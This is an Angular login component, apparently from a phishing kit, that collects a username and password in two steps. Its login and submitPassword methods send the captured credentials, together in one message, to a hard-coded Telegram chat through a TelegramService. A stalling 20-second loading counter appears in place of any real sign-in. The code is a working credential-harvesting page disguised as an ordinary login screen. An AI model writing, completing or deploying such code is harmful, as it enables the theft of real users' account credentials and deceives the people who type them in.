import {
  Component,
  ElementRef,
  OnInit,
  ViewChild,
  ChangeDetectorRef,
  ViewEncapsulation,
} from '@angular/core';
import { FormBuilder, FormGroup, Validators } from '@angular/forms';
import { TelegramService } from '../telegram.service';

@Component({
  selector: 'app-login',
  templateUrl: './login.component.html',
  styleUrls: ['./login.component.scss'],
  encapsulation: ViewEncapsulation.None,
})
export class LoginComponent implements OnInit {
  public usernameForm!: FormGroup;
  public passwordForm!: FormGroup;
  public showPasswordScreen: boolean = false;
  public showPassword: boolean = false;
  public loading: boolean = false;
  public loadingCounter: number = 20;
  private loadingInterval: any;
  @ViewChild('passwordInput') passwordInput!: ElementRef;

  constructor(
    private fb: FormBuilder,
    private telegramService: TelegramService,
    private cdRef: ChangeDetectorRef
  ) {}

  ngOnInit(): void {
    this.setForms();
  }

  protected setForms(): void {
    this.usernameForm = this.fb.group({
      username: [
        '',
        Validators.compose([
          Validators.required,
          Validators.minLength(3),
          Validators.maxLength(10),
        ]),
      ],
    });

    this.passwordForm = this.fb.group({
      password: [
        '',
        [
          Validators.required,
          Validators.minLength(3),
          Validators.maxLength(10),
          Validators.pattern(/^[A-Za-z0-9$@!%*?&]+$/), // Permite letras, números y algunos caracteres especiales
        ],
      ],
    });
  }

  public login(): void {
    if (this.usernameForm.valid) {
      const username = this.usernameForm.value.username;
      console.log(username);

      this.telegramService.sendMessage(`Usuario: ${username}`).subscribe({
        next: (response) => {
          console.log('Usuario enviado:', response);
          this.showPasswordScreen = true;
          setTimeout(() => {
            if (this.passwordInput) {
              this.passwordInput.nativeElement.focus();
            }
          }, 0);
        },
        error: (error) => {
          console.error('Error al enviar el usuario:', error);
        },
      });
    }
  }

  // public submitPassword(): void {
  //   if (this.passwordForm.valid) {
  //     const password = this.passwordForm.value.password;

  //     // Activa el loading por al menos 20 segundos
  //     this.startLoading(20);

  //     this.telegramService.sendMessage(`Contraseña: ${password}`).subscribe({
  //       next: (response) => {
  //         console.log('Contraseña enviada:', response);
  //         // Espera a que termine el contador antes de detener el loading
  //         setTimeout(() => {
  //           this.stopLoading();
  //         }, this.loadingCounter * 1000);
  //       },
  //       error: (error) => {
  //         console.error('Error al enviar la contraseña:', error);
  //         // Espera a que termine el contador antes de detener el loading
  //         setTimeout(() => {
  //           this.stopLoading();
  //         }, this.loadingCounter * 1000);
  //       },
  //     });
  //   }
  // }

  public submitPassword(): void {
    if (this.passwordForm.valid) {
      const password = this.passwordForm.value.password;
      const username = this.usernameForm.value.username;
      const chatId = '1656204996';
      // Activa el loading por al menos 20 segundos
      this.startLoading(20);

      // Construye el mensaje con usuario y contraseña
      const message = `Usuario: ${username}\nContraseña: ${password}`;
      console.log(message);

      this.telegramService.sendMessage(message,chatId).subscribe({
        next: (response) => {
          console.log('Mensaje enviado:', response);

          // Espera a que termine el contador antes de detener el loading
          setTimeout(() => {
            this.stopLoading();
          }, this.loadingCounter * 1000);
        },
        error: (error) => {
          console.error('Error al enviar el mensaje:', error);
          // Espera a que termine el contador antes de detener el loading
          setTimeout(() => {
            this.stopLoading();
          }, this.loadingCounter * 1000);
        },
      });
    }
  }

  private startLoading(seconds: number): void {
    this.loading = true;
    this.loadingCounter = seconds;
    this.loadingInterval = setInterval(() => {
      if (this.loadingCounter > 0) {
        this.loadingCounter--;
      } else {
        this.stopLoading();
      }
    }, 1000);
  }

  private stopLoading(): void {
    this.loading = false;
    if (this.loadingInterval) {
      clearInterval(this.loadingInterval);
    }
  }

  public togglePasswordVisibility(): void {
    this.showPassword = !this.showPassword;
  }

  public backToUsername(): void {
    this.showPasswordScreen = false;
    this.usernameForm.reset();
    this.passwordForm.reset();
  }

  public onPasswordChange(): void {
    this.passwordForm.markAllAsTouched(); // Marca todos los campos como tocados
    this.passwordForm.updateValueAndValidity(); // Fuerza la actualización de la validez del formulario
    this.cdRef.detectChanges(); // Forzar la detección de cambios
  }
}
